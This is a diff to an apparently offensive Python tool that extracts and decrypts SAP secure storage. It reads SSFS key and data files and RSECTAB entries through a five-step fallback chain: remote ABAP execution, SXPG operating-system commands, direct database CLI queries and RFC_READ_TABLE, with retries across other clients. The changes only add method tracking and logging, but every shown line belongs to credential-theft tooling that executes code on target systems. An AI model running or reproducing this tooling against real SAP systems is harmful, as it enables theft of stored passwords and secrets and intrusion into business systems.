@@ -1144,20 +1144,35 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
     _require_crypto()
 
     abap_blocked = False  # track if ABAP exec was blocked by SCC4
+    ssfs_method = None    # which method actually retrieved the SSFS files
+    rsectab_method = None # which method actually retrieved RSECTAB rows
 
-    # --- Step 1: Try to read SSFS files from OS ---
-    print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
+    print(f"[*] SecStore {node.sid}: SSFS+RSECTAB fallback chain — "
+          f"1) SSFS/OS via ABAP exec  2) SSFS/OS via SXPG  "
+          f"3) RSECTAB via RFC_ABAP_INSTALL_AND_RUN  "
+          f"4) RSECTAB via SXPG DB CLI  5) RSECTAB via RFC_READ_TABLE")
+
+    # --- Method 1: Try to read SSFS files from OS via ABAP exec ---
+    print(f"[*] SecStore {node.sid}: [Method 1] reading SSFS files from OS "
+          f"filesystem via RFC_ABAP_INSTALL_AND_RUN...")
     key_bytes, dat_bytes = _read_ssfs_files_via_abap(
         node, creds, soap_session=soap_session)
+    if key_bytes or dat_bytes:
+        ssfs_method = "Method 1 (SSFS files via RFC_ABAP_INSTALL_AND_RUN)"
+        print(f"[+] SecStore {node.sid}: [Method 1] SSFS files retrieved")
 
     # Detect "not permitted" error — SSFS read uses ABAP exec
     if key_bytes is None and dat_bytes is None:
         abap_blocked = True  # might be blocked, will confirm in step 2
-        # --- Step 1b: SXPG fallback for SSFS files ---
+        # --- Method 2: SXPG fallback for SSFS files ---
         # SXPG doesn't need ABAP exec — it runs OS commands via sapxpg
-        print(f"[*] {node.sid}: ABAP exec failed for SSFS, trying SXPG fallback...")
+        print(f"[*] {node.sid}: [Method 2] ABAP exec failed for SSFS, "
+              f"reading SSFS files via SXPG (SAPXPG OS command)...")
         key_bytes, dat_bytes = _read_ssfs_files_via_sxpg(
             node, creds, soap_route=soap_route)
+        if key_bytes or dat_bytes:
+            ssfs_method = "Method 2 (SSFS files via SXPG OS command)"
+            print(f"[+] SecStore {node.sid}: [Method 2] SSFS files retrieved")
 
     # Extract SSFS master key from KEY file (if available)
     ssfs_key = None
@@ -1194,24 +1209,39 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
         except Exception as e:
             print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {format_rfc_exception(e)}")
 
-    # --- Step 2: Read RSECTAB (the actual secure store entries) ---
-    print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
+    # --- Method 3: Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN ---
+    print(f"[*] SecStore {node.sid}: [Method 3] reading RSECTAB entries via "
+          f"RFC_ABAP_INSTALL_AND_RUN (ABAP report ZSECSTORE)...")
     rows = _read_rsectab_via_abap(
         node, creds, soap_session=soap_session)
+    if rows:
+        rsectab_method = "Method 3 (RSECTAB via RFC_ABAP_INSTALL_AND_RUN)"
+        print(f"[+] SecStore {node.sid}: [Method 3] {len(rows)} RSECTAB rows "
+              f"retrieved")
 
     if rows is None:
         abap_blocked = True
-        # --- Step 2b: Try SXPG with direct DB query ---
-        print(f"[*] {node.sid} client {creds.client}: "
-              f"ABAP exec unavailable, trying SXPG database query...")
+        # --- Method 4: Try SXPG with direct DB query ---
+        print(f"[*] {node.sid} client {creds.client}: [Method 4] "
+              f"ABAP exec unavailable — reading RSECTAB via SXPG database "
+              f"CLI query (hdbsql/sqlplus/sqlcmd/db2/dbmcli)...")
         rows = _read_rsectab_via_sxpg(node, creds)
+        if rows:
+            rsectab_method = "Method 4 (RSECTAB via SXPG DB CLI)"
+            print(f"[+] SecStore {node.sid}: [Method 4] {len(rows)} RSECTAB "
+                  f"rows retrieved via direct DB query")
 
     if rows is None:
-        # --- Step 2c: RFC_READ_TABLE fallback (unreliable for RAW) ---
-        print(f"[*] {node.sid}: SXPG DB query failed, "
-              f"falling back to RFC_READ_TABLE")
+        # --- Method 5: RFC_READ_TABLE fallback (unreliable for RAW) ---
+        print(f"[*] {node.sid}: [Method 5] SXPG DB query failed — "
+              f"last-resort fallback to RFC_READ_TABLE "
+              f"(RAW field may be truncated)")
         rows = _read_rsectab_via_rfc(
             node, creds, soap_session=soap_session)
+        if rows:
+            rsectab_method = "Method 5 (RSECTAB via RFC_READ_TABLE — DATA may be truncated)"
+            print(f"[+] SecStore {node.sid}: [Method 5] {len(rows)} RSECTAB "
+                  f"rows retrieved (DATA field may be incomplete)")
 
     # --- Step 2d: Client fallback if everything above failed ---
     if not rows and abap_blocked:
@@ -1254,11 +1284,15 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                             pass
 
                 # Retry RSECTAB with alternative client
-                print(f"[*] {node.sid}: Retrying RSECTAB read via "
-                      f"client {alt_client}...")
+                print(f"[*] {node.sid}: [Method 3, retry] retrying RSECTAB "
+                      f"read via RFC_ABAP_INSTALL_AND_RUN in client "
+                      f"{alt_client}...")
                 rows = _read_rsectab_via_abap(
                     node, alt_creds, soap_session=soap_session)
                 if rows:
+                    rsectab_method = (f"Method 3 (RSECTAB via "
+                                      f"RFC_ABAP_INSTALL_AND_RUN, client "
+                                      f"{alt_client})")
                     print(f"[+] {node.sid}: SecStore read succeeded via "
                           f"client {alt_client}")
                     break
@@ -1273,6 +1307,11 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
         else:
             print(f"[-] {node.sid} client {creds.client}: SecStore no entries found")
         return []
+
+    # --- Summary: which methods actually won ---
+    print(f"[i] SecStore {node.sid}: extraction summary — "
+          f"SSFS: {ssfs_method or 'not retrieved (using default key)'} | "
+          f"RSECTAB: {rsectab_method or 'unknown'}")
 
     # --- Step 3: Decrypt all entries ---
     print(f"[*] SecStore {node.sid}: {len(rows)} entries, decrypting "
